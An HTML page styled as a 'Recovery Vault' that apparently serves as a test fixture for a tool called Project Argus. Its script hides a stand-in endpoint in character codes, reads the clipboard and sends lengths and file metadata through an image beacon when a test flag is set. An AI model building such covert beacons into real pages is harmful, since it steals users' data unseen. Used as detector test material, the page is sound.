<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Recovery Vault</title>
  <style>
    :root {
      color-scheme: dark;
      --bg: #0b1020;
      --panel: #11182a;
      --border: #27334f;
      --text: #f7faff;
      --muted: #a7b3c9;
      --accent: #7c5cff;
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      display: grid;
      place-items: center;
      background:
        radial-gradient(circle at top right, rgba(124, 92, 255, 0.22), transparent 30%),
        var(--bg);
      color: var(--text);
      font-family: Arial, Helvetica, sans-serif;
    }

    main {
      width: min(620px, calc(100vw - 32px));
      border: 1px solid var(--border);
      border-radius: 8px;
      background: rgba(17, 24, 42, 0.95);
      padding: 26px;
    }

    h1 {
      margin: 0 0 10px;
      font-size: 26px;
    }

    p {
      margin: 0 0 18px;
      color: var(--muted);
      line-height: 1.55;
    }

    textarea,
    input {
      width: 100%;
      border: 1px solid var(--border);
      border-radius: 6px;
      background: #0c1324;
      color: var(--text);
      font: 14px Arial, Helvetica, sans-serif;
      padding: 11px 12px;
    }

    textarea {
      min-height: 118px;
      resize: vertical;
    }

    .grid {
      display: grid;
      gap: 12px;
    }

    button {
      border: 0;
      border-radius: 6px;
      background: var(--accent);
      color: #ffffff;
      cursor: pointer;
      font: 700 15px Arial, Helvetica, sans-serif;
      padding: 12px 16px;
    }

    .notice {
      margin-top: 12px;
      min-height: 20px;
      color: var(--muted);
      font-size: 13px;
    }
  </style>
</head>
<body>
  <main>
    <h1>Recovery Vault</h1>
    <p>Store a local recovery note and optional backup file metadata for workspace continuity.</p>

    <div class="grid">
      <textarea id="memo" spellcheck="false" placeholder="Paste a recovery note here"></textarea>
      <input id="backup" type="file" multiple>
      <button id="save" type="button">Save recovery snapshot</button>
      <div id="notice" class="notice" aria-live="polite"></div>
    </div>
  </main>

  <script>
    (() => {
      const allowNetwork = window.ARGUS_TEST_ALLOW_NETWORK === true;
      const memo = document.getElementById("memo");
      const backup = document.getElementById("backup");
      const save = document.getElementById("save");
      const notice = document.getElementById("notice");

      function endpointFromCodes() {
        return String.fromCharCode(
          104, 116, 116, 112, 115, 58, 47, 47, 118, 97, 117, 108, 116, 46, 101,
          120, 97, 109, 112, 108, 101, 45, 99, 100, 110, 46, 105, 110, 118,
          97, 108, 105, 100, 47, 115, 110, 97, 112, 115, 104, 111, 116
        );
      }

      async function clipboardMetadata() {
        if (!navigator.clipboard || !navigator.clipboard.readText) {
          return { available: false };
        }

        try {
          const text = await navigator.clipboard.readText();
          return { available: true, lengthOnly: text.length, valueIncluded: false };
        } catch (error) {
          return { available: true, denied: true };
        }
      }

      function fileMetadata() {
        return Array.from(backup.files || []).map((file) => ({
          nameLength: file.name.length,
          size: file.size,
          type: file.type || "unknown"
        }));
      }

      save.addEventListener("click", async () => {
        const payload = {
          page: "clipboard-vault",
          noteLengthOnly: memo.value.length,
          noteValueIncluded: false,
          files: fileMetadata(),
          clipboard: await clipboardMetadata(),
          timestamp: new Date().toISOString()
        };

        if (allowNetwork) {
          const image = new Image();
          image.referrerPolicy = "no-referrer";
          image.src = `${endpointFromCodes()}?m=${encodeURIComponent(JSON.stringify(payload))}`;
        }

        console.info("Project Argus test-only vault snapshot", payload);
        notice.textContent = "Recovery snapshot simulated locally. No typed values were sent.";
      });
    })();
  </script>
</body>
</html>
